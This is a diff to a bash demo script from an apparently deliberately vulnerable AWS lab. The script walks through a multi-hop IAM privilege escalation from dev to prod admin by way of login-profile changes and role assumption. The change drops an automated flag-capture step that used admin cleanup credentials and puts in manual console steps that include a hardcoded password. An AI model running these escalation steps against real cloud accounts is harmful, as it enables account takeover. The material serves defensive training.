@@ -61,15 +61,6 @@ if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
     exit 1
 fi
 
-# Retrieve prod admin cleanup credentials for flag capture (Jeremy's admin equivalent)
-ADMIN_ACCESS_KEY=$(terraform output -raw prod_admin_user_for_cleanup_access_key_id 2>/dev/null)
-ADMIN_SECRET_KEY=$(terraform output -raw prod_admin_user_for_cleanup_secret_access_key 2>/dev/null)
-
-if [ -z "$ADMIN_ACCESS_KEY" ] || [ "$ADMIN_ACCESS_KEY" == "null" ]; then
-    echo -e "${RED}Error: Could not find prod admin credentials in terraform output${NC}"
-    exit 1
-fi
-
 echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 cd - > /dev/null
 
@@ -77,13 +68,6 @@ cd - > /dev/null
 use_readonly_creds() {
     export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
     export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
-    unset AWS_SESSION_TOKEN
-}
-use_jeremy_admin_creds() {
-    # pl-Jeremy is an admin in prod; represented here by the prod admin cleanup user
-    # since Jeremy only has console access in this scenario
-    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
-    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
     unset AWS_SESSION_TOKEN
 }
 
@@ -242,23 +226,6 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
                 unset AWS_SECRET_ACCESS_KEY
                 unset AWS_SESSION_TOKEN
 
-                # [EXPLOIT] Step 8: Capture the CTF flag from SSM Parameter Store
-                # pl-Jeremy holds full admin in prod. For this automated demo, the flag is
-                # read using equivalent admin credentials since Jeremy only has console access.
-                use_jeremy_admin_creds
-                echo -e "${YELLOW}Step 8: Capturing CTF flag from SSM Parameter Store${NC}"
-                FLAG_PARAM_NAME="/pathfinding-labs/flags/multi-hop-both-sides-to-admin"
-                show_attack_cmd "Attacker (Jeremy/prod admin)" "aws ssm get-parameter --name $FLAG_PARAM_NAME --query 'Parameter.Value' --output text"
-                FLAG_VALUE=$(aws ssm get-parameter --name "$FLAG_PARAM_NAME" --query 'Parameter.Value' --output text 2>/dev/null)
-
-                if [ -n "$FLAG_VALUE" ] && [ "$FLAG_VALUE" != "None" ]; then
-                    echo -e "${GREEN}✓ Flag captured: ${FLAG_VALUE}${NC}"
-                else
-                    echo -e "${RED}✗ Failed to read flag from $FLAG_PARAM_NAME${NC}"
-                    exit 1
-                fi
-                echo ""
-
                 # Restore helpful permissions for manual exploration
                 restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
 
@@ -271,7 +238,7 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
 
                 echo ""
                 echo -e "${GREEN}========================================${NC}"
-                echo -e "${GREEN}CTF FLAG CAPTURED!${NC}"
+                echo -e "${GREEN}✅ PRIVILEGE ESCALATION SUCCESSFUL — CONSOLE ACCESS OBTAINED${NC}"
                 echo -e "${GREEN}========================================${NC}"
                 echo -e "\n${YELLOW}Attack Summary:${NC}"
                 echo "The attack successfully demonstrated multi-hop privilege escalation:"
@@ -279,7 +246,6 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
                 echo "2. Josh (admin in dev) assumed trustsdev role in prod"
                 echo "3. Trustsdev role updated Jeremy's login profile in prod"
                 echo "4. Jeremy now has admin access in prod account"
-                echo "5. Captured CTF flag from SSM Parameter Store: $FLAG_VALUE"
                 echo ""
 
                 echo -e "\n${YELLOW}Attack Path:${NC}"
@@ -287,7 +253,24 @@ if HELPDESK_CREDENTIALS=$(aws sts assume-role --role-arn "$HELPDESK_ROLE_ARN" --
                 echo -e "  → (iam:CreateLoginProfile) → pl-Josh (dev admin)"
                 echo -e "  → (sts:AssumeRole) → pl-trustsdev (prod)"
                 echo -e "  → (iam:UpdateLoginProfile) → pl-Jeremy (prod admin)"
-                echo -e "  → (ssm:GetParameter) → CTF Flag"
+                echo ""
+
+                echo -e "${YELLOW}========================================${NC}"
+                echo -e "${YELLOW}AUTOMATED DEMO ENDS HERE — CAPTURE THE FLAG MANUALLY${NC}"
+                echo -e "${YELLOW}========================================${NC}"
+                echo "The attacker now holds a working console password for pl-Jeremy in the prod"
+                echo "account but no programmatic credentials exist for that user, so the automated"
+                echo "demo cannot read the CTF flag on your behalf. Complete the scenario manually:"
+                echo ""
+                echo "  1. Sign in to the prod AWS Console as pl-Jeremy with the new password"
+                echo "     ('NewJeremyPassword123!')."
+                echo "  2. From the console, open AWS CloudShell (top-right toolbar) and run:"
+                echo ""
+                echo -e "       ${CYAN}aws ssm get-parameter \\"
+                echo -e "         --name /pathfinding-labs/flags/multi-hop-both-sides-to-admin \\"
+                echo -e "         --query 'Parameter.Value' --output text${NC}"
+                echo ""
+                echo "     Or read the parameter directly via Systems Manager > Parameter Store."
                 echo ""
 
                 # Output standardized test results
